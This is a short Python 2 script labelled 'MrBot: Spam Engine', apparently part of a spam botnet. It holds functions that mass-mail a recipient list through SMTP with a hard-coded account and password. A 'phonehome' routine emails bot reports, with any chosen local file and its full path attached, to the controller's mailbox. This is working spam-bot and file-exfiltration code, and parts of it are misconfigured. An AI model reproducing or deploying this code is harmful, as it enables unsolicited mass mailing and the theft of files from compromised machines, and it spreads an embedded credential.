#!/usr/bin/env python
#
# MrBot: Spam Engine
#
# Date: Oct. 22, 2012
# All rights reserved.
#

import os
import smtplib
import mimetypes
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email import encoders

subject0='Re: Approved'
sender0='lynch.barack@gmail.com'
sndpwd0='lynch.barack'
sndsrv0='pop.gmail.com'
sndport0=25
recvlist0=['', '']
text='Hello, Mr. Wrong!'
html="""<html><head></head><body><p>Hi<br>how are you!<br>Here is the http://www.abc.edu" you want.</p></body></html>"""

BotID='MrBot1172'

def phonehome(message, path):
	try:
		mail = MIMEMultipart()
		mail['Subject'] = 'Mr.Bot Report from %s' % BotID
		mail['From'] = sender0
		mail['To'] = sender0

		part1 = MIMEText(message, 'plain')
		mail.attach(part1)

		if path is not None and os.path.isfile(path):
			ctype, encoding=mimetypes.guess_type(path)
			if ctype is None or encoding is not None:
				ctype = 'application/octet-stream'
			maintype, subtype=ctype.split('/', 1)
			fp = open(path, 'rb')
			if maintype == 'text':
				msg=MIMEText(fp.read(),_subtype=subtype)
			elif maintype == 'image':
				msg=MIMEImage(fp.read(),_subtype=subtype)
			elif maintype == 'audio':
				msg=MIMEAudio(fp.read(),_subtype=subtype)
			else:
				msg=MIMEBase(maintype, subtype)
				msg.set_payload(fp.read())
				encoders.encode_base64(msg)
			fp.close()
			msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(path))
			mail.attach(msg)
			part2 = MIMEText(os.path.abspath(path), 'plain')
			mail.attach(part2)
		send_email(mail.as_string(), sender0, sndpwd0, sndsrv0, sndport0, sender0)
	except Exception as inst:
		print type(inst)
		print inst.args 
		print inst
		print "Poor, homeless Mr. Bot"

def spamming(subject, text, recvlist, sender, sndpwd, sndsrv, sndport):
	msg=MIMEMultipart()
	msg['Subject'] = subject
	msg['From'] = sender

	part1 = MIMEText(text, 'plain')
	#part2 = MIMEText(message['html'], 'html')
	msg.attach(part1)
	#msg.attach(part2)
	for recv in recvlist:
		msg['To'] = recv
		send_email(msg.as_string(), sender, sndpwd, sndsrv, sndport, recv)

def send_email(msg, sender, sndpwd, sndsrv, sndport, recv):
	try:
		smtpobj=smtplib.SMTP(sndsrv, sndport)
		smtpobj.starttls()
		smtpobj.login(sender, sndpwd)
		smtpobj.sendmail(sender, recv, msg)
		print "Success to sent Email to", recv
	except smtplib.SMTPSenderRefused:
		print "Unable to send email to", recv
	except smtplib.SMTPAuthenticationError:
		print "Unable to authenticate"
	except:
		print "Unable to send email"
	finally:
		smtpobj.quit()

if __name__ == "__main__":
	message0 = {'text': text, 'html':html}
	spamming(subject0, text, recvlist0, sender0, sndpwd0, sndsrv0, sndport0)
		
	
